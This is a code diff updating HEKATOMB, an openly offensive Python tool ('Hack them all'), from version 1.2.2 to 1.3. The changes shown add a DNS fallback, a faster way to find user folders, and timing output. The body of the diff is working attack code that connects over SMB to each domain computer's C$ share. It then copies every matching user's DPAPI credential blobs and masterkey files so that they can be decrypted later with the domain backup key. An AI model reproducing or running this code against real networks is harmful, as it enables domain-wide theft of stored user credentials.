@@ -2,7 +2,7 @@
 #
 # HEKATOMB - Because Domain Admin rights are not enough. Hack them all.
 #
-# V 1.2.2
+# V 1.3
 #
 # Copyright (C) 2022 Les tutos de Processus. All rights reserved.
 #
@@ -18,7 +18,7 @@
 #	C0wnuts (@kevin_racca)
 #
 
-import os, sys, argparse, random, string
+import os, sys, argparse, random, string, time
 from ldap3 import Connection, Server, NTLM, ALL
 from impacket.examples.utils import parse_target
 from impacket.smbconnection import SMBConnection
@@ -44,7 +44,9 @@ sys.tracebacklimit = 0
 
 
 def main():
-	print("\n██░ ██ ▓█████  ██ ▄█▀▄▄▄     ▄▄▄█████▓ ▒█████   ███▄ ▄███▓ ▄▄▄▄   \n▓██░ ██▒▓█   ▀  ██▄█▒▒████▄   ▓  ██▒ ▓▒▒██▒  ██▒▓██▒▀█▀ ██▒▓█████▄ \n▒██▀▀██░▒███   ▓███▄░▒██  ▀█▄ ▒ ▓██░ ▒░▒██░  ██▒▓██    ▓██░▒██▒ ▄██\n░▓█ ░██ ▒▓█  ▄ ▓██ █▄░██▄▄▄▄██░ ▓██▓ ░ ▒██   ██░▒██    ▒██ ▒██░█▀  \n░▓█▒░██▓░▒████▒▒██▒ █▄▓█   ▓██▒ ▒██▒ ░ ░ ████▓▒░▒██▒   ░██▒░▓█  ▀█▓\n ▒ ░░▒░▒░░ ▒░ ░▒ ▒▒ ▓▒▒▒   ▓▒█░ ▒ ░░   ░ ▒░▒░▒░ ░ ▒░   ░  ░░▒▓███▀▒\n ▒ ░▒░ ░ ░ ░  ░░ ░▒ ▒░ ▒   ▒▒ ░   ░      ░ ▒ ▒░ ░  ░      ░▒░▒   ░ \n ░  ░░ ░   ░   ░ ░░ ░  ░   ▒    ░      ░ ░ ░ ▒  ░      ░    ░    ░ \n ░  ░  ░   ░  ░░  ░        ░  ░            ░ ░         ░    ░      \n   Because Domain Admin rights are not enough.\n\t\tHack them all.\n\n\t         @Processus\n**************************************************\n\n")
+	print("\n██░ ██ ▓█████  ██ ▄█▀▄▄▄     ▄▄▄█████▓ ▒█████   ███▄ ▄███▓ ▄▄▄▄   \n▓██░ ██▒▓█   ▀  ██▄█▒▒████▄   ▓  ██▒ ▓▒▒██▒  ██▒▓██▒▀█▀ ██▒▓█████▄ \n▒██▀▀██░▒███   ▓███▄░▒██  ▀█▄ ▒ ▓██░ ▒░▒██░  ██▒▓██    ▓██░▒██▒ ▄██\n░▓█ ░██ ▒▓█  ▄ ▓██ █▄░██▄▄▄▄██░ ▓██▓ ░ ▒██   ██░▒██    ▒██ ▒██░█▀  \n░▓█▒░██▓░▒████▒▒██▒ █▄▓█   ▓██▒ ▒██▒ ░ ░ ████▓▒░▒██▒   ░██▒░▓█  ▀█▓\n ▒ ░░▒░▒░░ ▒░ ░▒ ▒▒ ▓▒▒▒   ▓▒█░ ▒ ░░   ░ ▒░▒░▒░ ░ ▒░   ░  ░░▒▓███▀▒\n ▒ ░▒░ ░ ░ ░  ░░ ░▒ ▒░ ▒   ▒▒ ░   ░      ░ ▒ ▒░ ░  ░      ░▒░▒   ░ \n ░  ░░ ░   ░   ░ ░░ ░  ░   ▒    ░      ░ ░ ░ ▒  ░      ░    ░    ░ \n ░  ░  ░   ░  ░░  ░        ░  ░            ░ ░         ░    ░      \n   Because Domain Admin rights are not enough.\n\t\tHack them all.\n\n\t         @Processus\n\t            v1.3\n**************************************************\n\n")
+
+	start = time.time()
 
 	parser = argparse.ArgumentParser(add_help = True, description = "Script used to automate domain computers and users extraction from LDAP and extraction of domain controller private key through RPC to collect and decrypt all users' DPAPI secrets saved in Windows credential manager.")
 
@@ -56,7 +58,6 @@ def main():
 	options = parser.add_argument_group('authentication')
 	options.add_argument('-pvk', action='store', help='\t\t\t\t\t\t\t\t\t\tDomain backup keys file')
 	options.add_argument('-dns', action="store", help='DNS server IP address to resolve computers hostname')
-	options.add_argument('-dnstcp', action="store_true", help='Use TCP for DNS connection')
 	options.add_argument('-port', choices=['139', '445'], nargs='?', default='445', metavar="port", help='Port to connect to SMB Server')
 	options.add_argument('-smb2', action="store_true", help='Force the use of SMBv2 protocol')
 	options.add_argument('-just-user', action='store', help='Test only specified username')
@@ -254,12 +255,12 @@ def main():
 			resolver             = dns.resolver.Resolver(configure=False)
 			resolver.nameservers = [dns_server]
 			current_computer     = current_computer + "." + domain
-			if options.dnstcp is True:
-				answer = resolver.resolve(current_computer, "A", tcp=True)
-			else:
-				answer = resolver.resolve(current_computer, "A")
+			# trying dns resolution in UDP and if it fails, we try in TCP
+			answer = resolver.resolve(current_computer, "A")
 			if len(answer) == 0:
-				sys.exit(1)
+				answer = resolver.resolve(current_computer, "A", tcp=True)
+				if len(answer) == 0:
+					sys.exit(1)
 			else:
 				answer = str(answer[0])
 			smbClient  = SMBConnection(answer, answer, myName=myName, sess_port=int(options.port), timeout=10, preferredDialect=preferredDialect)
@@ -267,60 +268,66 @@ def main():
 			tid = smbClient.connectTree('c$')
 			if tid != 1:
 				sys.exit(1)
+			# Instead of testing all users folder, just get content and compare folder names to usernames array to find existing folders faster (thanks to @kal-u for the idea)
+			existing_users_folder = smbClient.listPath("C$", "\\users\\*")
+			
+			for current_user_folder in existing_users_folder:
+				current_user_folder = str( str(current_user_folder).split("longname=\"")[1] ).split("\", filesize=")[0].lower()
+				for current_user in users_list:
+					if current_user_folder != "." and current_user_folder != ".." :
+						if str(current_user[0]).lower() == str(current_user_folder).lower():
+							try:
+								if options.debug is True:
+									print("Find existing user " + str(current_user[0]) + " on computer " + str(current_computer) )
+								response = smbClient.listPath("C$", "\\users\\" + current_user[0] + "\\appData\\Roaming\\Microsoft\\Credentials\\*")
+								is_there_any_blob_for_this_user = False
+								count_blobs = 0
+								count_mkf   = 0
+								for blob_file in response:
+									blob_file = str( str(blob_file).split("longname=\"")[1] ).split("\", filesize=")[0]
+									if blob_file != "." and blob_file != "..":
+										# create and retrieve the credential blob
+										count_blobs     = count_blobs + 1
+										computer_folder = blobFolder + "/" + str(current_computer)
+										if not os.path.exists(computer_folder):
+											os.mkdir(computer_folder)
+										user_folder = computer_folder + "/" + str(current_user[0])
+										if not os.path.exists(user_folder):
+											os.mkdir(user_folder)
+										wf = open(user_folder + "/" + blob_file,'wb')
+										smbClient.getFile("C$", "\\users\\" + current_user[0] + "\\appData\\Roaming\\Microsoft\\Credentials\\" + blob_file, wf.write)
+										is_there_any_blob_for_this_user = True
+								response = smbClient.listPath("C$", "\\users\\" + current_user[0] + "\\appData\\Local\\Microsoft\\Credentials\\*")
 
-			for current_user in users_list:
-				try:
-					if options.debugmax is True:
-						print("Trying user " + str(current_user[0]) + " on computer " + str(current_computer) )
-					response = smbClient.listPath("C$", "\\users\\" + current_user[0] + "\\appData\\Roaming\\Microsoft\\Credentials\\*")
-					is_there_any_blob_for_this_user = False
-					count_blobs = 0
-					count_mkf   = 0
-					for blob_file in response:
-						blob_file = str( str(blob_file).split("longname=\"")[1] ).split("\", filesize=")[0]
-						if blob_file != "." and blob_file != "..":
-							# create and retrieve the credential blob
-							count_blobs     = count_blobs + 1
-							computer_folder = blobFolder + "/" + str(current_computer)
-							if not os.path.exists(computer_folder):
-								os.mkdir(computer_folder)
-							user_folder = computer_folder + "/" + str(current_user[0])
-							if not os.path.exists(user_folder):
-								os.mkdir(user_folder)
-							wf = open(user_folder + "/" + blob_file,'wb')
-							smbClient.getFile("C$", "\\users\\" + current_user[0] + "\\appData\\Roaming\\Microsoft\\Credentials\\" + blob_file, wf.write)
-							is_there_any_blob_for_this_user = True
-					response = smbClient.listPath("C$", "\\users\\" + current_user[0] + "\\appData\\Local\\Microsoft\\Credentials\\*")
-
-					for blob_file in response:
-						blob_file = str( str(blob_file).split("longname=\"")[1] ).split("\", filesize=")[0]
-						if blob_file != "." and blob_file != "..":
-							# create and retrieve the credential blob
-							count_blobs     = count_blobs + 1
-							computer_folder = blobFolder + "/" + str(current_computer)
-							if not os.path.exists(computer_folder):
-								os.mkdir(computer_folder)
-							user_folder = computer_folder + "/" + str(current_user[0])
-							if not os.path.exists(user_folder):
-								os.mkdir(user_folder)
-							wf = open(user_folder + "/" + blob_file,'wb')
-							smbClient.getFile("C$", "\\users\\" + current_user[0] + "\\appData\\Local\\Microsoft\\Credentials\\" + blob_file, wf.write)
-							is_there_any_blob_for_this_user = True
-					if is_there_any_blob_for_this_user is True:
-						# If there is cred blob there is mkf so we have to get them too
-						response = smbClient.listPath("C$", "\\users\\" + current_user[0] + "\\appData\\Roaming\\Microsoft\\Protect\\" + current_user[1] + "\\*")
-						for mkf in response:
-							mkf = str( str(mkf).split("longname=\"")[1] ).split("\", filesize=")[0]
-							if mkf != "." and mkf != ".." and mkf != "Preferred" and mkf[0:3] != "BK-":
-								count_mkf = count_mkf + 1
-								wf        = open(mkfFolder + "/" + mkf,'wb')
-								smbClient.getFile("C$", "\\users\\" + current_user[0] + "\\appData\\Roaming\\Microsoft\\Protect\\" + current_user[1] + "\\" + mkf, wf.write)
-						print("\nNew credentials found for user " + str(current_user[0]) + " on " + str(current_computer) + " :")
-						print("Retrieved " + str(count_blobs) + " credential blob(s) and " + str(count_mkf) + " masterkey file(s)")	
-				except KeyboardInterrupt:
-					os._exit(1)
-				except:
-					pass # this user folder do not exist on this computer
+								for blob_file in response:
+									blob_file = str( str(blob_file).split("longname=\"")[1] ).split("\", filesize=")[0]
+									if blob_file != "." and blob_file != "..":
+										# create and retrieve the credential blob
+										count_blobs     = count_blobs + 1
+										computer_folder = blobFolder + "/" + str(current_computer)
+										if not os.path.exists(computer_folder):
+											os.mkdir(computer_folder)
+										user_folder = computer_folder + "/" + str(current_user[0])
+										if not os.path.exists(user_folder):
+											os.mkdir(user_folder)
+										wf = open(user_folder + "/" + blob_file,'wb')
+										smbClient.getFile("C$", "\\users\\" + current_user[0] + "\\appData\\Local\\Microsoft\\Credentials\\" + blob_file, wf.write)
+										is_there_any_blob_for_this_user = True
+								if is_there_any_blob_for_this_user is True:
+									# If there is cred blob there is mkf so we have to get them too
+									response = smbClient.listPath("C$", "\\users\\" + current_user[0] + "\\appData\\Roaming\\Microsoft\\Protect\\" + current_user[1] + "\\*")
+									for mkf in response:
+										mkf = str( str(mkf).split("longname=\"")[1] ).split("\", filesize=")[0]
+										if mkf != "." and mkf != ".." and mkf != "Preferred" and mkf[0:3] != "BK-":
+											count_mkf = count_mkf + 1
+											wf        = open(mkfFolder + "/" + mkf,'wb')
+											smbClient.getFile("C$", "\\users\\" + current_user[0] + "\\appData\\Roaming\\Microsoft\\Protect\\" + current_user[1] + "\\" + mkf, wf.write)
+									print("New credentials found for user " + str(current_user[0]) + " on " + str(current_computer) + " :")
+									print("Retrieved " + str(count_blobs) + " credential blob(s) and " + str(count_mkf) + " masterkey file(s)")	
+							except KeyboardInterrupt:
+								os._exit(1)
+							except:
+								pass # this user folder do not exist on this computer
 		except KeyboardInterrupt:
 			os._exit(1)
 		except dns.exception.DNSException:
@@ -330,7 +337,7 @@ def main():
 				traceback.print_exc()
 			pass
 		except:
-			if options.debugmax is True:
+			if options.debug is True:
 				print("Debug : Could not connect to computer : " + str(current_computer))
 			if options.debugmax is True:
 				import traceback
@@ -505,6 +512,9 @@ def main():
 								pass
 		if len(array_of_credentials) > 0:
 			if options.debug is True:
+				end = time.time()
+				elapsed = round(end - start)
+				print("Credentials gathered and decrypted in " + str(elapsed) + " seconds\n")
 				print(str(len(array_of_credentials)) + " credentials have been decrypted !\n")
 			i = 0
 			if options.csv is True:
